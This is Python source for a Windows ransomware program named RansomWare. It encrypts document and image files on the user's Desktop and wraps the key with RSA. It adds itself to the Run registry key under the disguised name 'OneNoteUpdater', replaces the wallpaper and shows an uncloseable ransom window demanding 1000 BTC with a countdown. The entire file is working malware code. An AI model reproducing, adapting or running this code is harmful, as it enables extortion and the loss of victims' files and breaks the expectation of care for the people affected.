# Imports
from cryptography.fernet import Fernet
import os
import ctypes
import urllib.request
import requests
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from tkinter import *
import winreg
import psutil
from threading import Thread


class RansomWare:
    file_exts = ['txt', 'pdf', 'png', 'jpg']

    def __init__(self):
        self.key = None
        self.crypter = None
        self.public_key = None
        self.sysRoot = os.path.expanduser('~')
        self.localRoot = os.path.join(self.sysRoot,'Desktop')
        self.publicIP = requests.get('https://api.ipify.org').text

    def generate_key(self):
        self.key = Fernet.generate_key()
        self.crypter = Fernet(self.key)

    def write_key(self):
        key_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Temp', 'fernet_key.txt')
        if not os.path.exists(key_path):
            with open(key_path, 'wb') as f:
                f.write(self.key)

    def encrypt_fernet_key(self):
        key_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Temp', 'fernet_key.txt')
        public_key = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'OneDrive', 'public.pem')
        with open(key_path, 'rb') as fk:
            fernet_key = fk.read()
        if not os.path.exists(key_path):
            with open(key_path, 'wb') as f:
                self.public_key = RSA.import_key(open(public_key).read())
                public_crypter = PKCS1_OAEP.new(self.public_key)
                enc_fernent_key = public_crypter.encrypt(fernet_key)
                f.write(enc_fernent_key)
                self.key = enc_fernent_key
                ctypes.windll.kernel32.SetFileAttributesW(key_path, 2)
                
        else:
            self.key = fernet_key
        self.crypter = None

    def crypt_file(self, file_path, encrypted=False):
        with open(file_path, 'rb') as f:
            data = f.read()
            if not encrypted:
                _data = self.crypter.encrypt(data)
            else:
                _data = self.crypter.decrypt(data)
        with open(file_path, 'wb') as fp:
            fp.write(_data)
        if not encrypted:
            new_path = file_path + ".encrypt"
            os.rename(file_path, new_path)
            return new_path

    def crypt_system(self, encrypted=False):
        system = os.walk(self.localRoot, topdown=True)
        for root, _, files in system:
            for file in files:
                file_path = os.path.join(root, file)
                if file.split('.')[-1] not in self.file_exts:
                    continue
                self.crypt_file(file_path, encrypted=encrypted)

    def already_exists(self, key_path, key_name):
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_READ)
            winreg.QueryValueEx(key, key_name)
            winreg.CloseKey(key)
            return True
        except WindowsError:
            return False

    def set_high_priority(self):
        pid = os.getpid()
        p = psutil.Process(pid)
        p.nice(psutil.HIGH_PRIORITY_CLASS)
        handle = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, pid)
        ctypes.windll.kernel32.SetPriorityClass(handle, 0x00000080)
        ctypes.windll.kernel32.CloseHandle(handle)

    def add_to_startup(self, file_path, key_name="OneNoteUpdater"):
        key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        path = os.path.expandvars(file_path)
        value = f'{path}\\RansomWare.exe --no-startup-window --win-session-start'
        if not self.already_exists(key_path, key_name):
            winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, value)
            winreg.CloseKey(key)

    def change_desktop_background(self):
        imageUrl = 'https://external-content.duckduckgo.com/iu/?u=http%3A%2F%2Fgetwallpapers.com%2Fwallpaper%2Ffull%2F6%2F6%2Fc%2F266252.jpg&f=1&nofb=1&ipt=3f9154ef99c2da2759ffc5be46ba3698072b73b2bd6891ef1cbd7e5fa93eabb3&ipo=images'
        path = f'{self.sysRoot}\\AppData\\Local\\Temp\\72dks289d9dfd89wf.jpg'
        urllib.request.urlretrieve(imageUrl, path)
        SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)

    def show_ransom_note(self):
        root = Tk()
        root.title("OOOOOPS...PAY ATTENTION")
        root.geometry("700x500")
        root.resizable(False, False)

        def disable_event():
            pass

        root.protocol("WM_DELETE_WINDOW", disable_event) 
        
        Tk_Width = 700
        Tk_Height = 500

    
        x_Left = int(root.winfo_screenwidth()/2 - Tk_Width/2)
        y_Top = int(root.winfo_screenheight()/2 - Tk_Height/2)
        
        root.geometry(f"+{x_Left}+{y_Top}")

        lb=Label(root,text="LAZARUS",font=("Segoe UI Black",24),bg="red",fg="white")
        message_lb=Label(root,text="Your Files Are Be Encrypted, for Decrypt It\n Send 1000BTC in this Adress Before 21 Hours : \n ThDY834SVZGJfsdabsozv52lzssz084Bcsvz",font=("Segoe UI Black",15))
        compteur_label=Label(root,font=("Segoe UI Black",60))


        root.attributes("-toolwindow", True)
        root.attributes("-topmost", True)

        def compteur(timing):
            time_var = timing.split(":")
            hour = int(time_var[0])
            minu = int(time_var[1])
            sec = int(time_var[2])
            compteur_label['text'] = "{}:{}:{}".format(hour, minu, sec)
            if sec > 0 or minu > 0 or hour > 0:
                if sec > 0:
                    sec -= 1
                elif minu > 0:
                    minu -= 1
                    sec = 59
                elif hour > 0:
                    hour -= 1
                    minu = 59
                    sec = 59
                root.after(1000, compteur, f"{hour:02}:{minu:02}:{sec:02}")

        root.columnconfigure(0, weight=1)
        root.rowconfigure([0, 1, 2], weight=1)

        lb.grid(row=0,column=0,padx=240)
        message_lb.grid(row=1, column=0, pady=10, sticky="n")
        compteur_label.grid(row=2, column=0, pady=20, sticky="n" )
        compteur("21:59:10")
        root.mainloop()

def main():
    rw = RansomWare()
    rw.generate_key()
    rw.crypt_system()
    rw.write_key()
    rw.encrypt_fernet_key()
    rw.change_desktop_background()
    rw.add_to_startup(rw.localRoot)
    rw.set_high_priority()

    t1 = Thread(target=rw.show_ransom_note)
    t1.start()

if __name__ == '__main__':
    main()
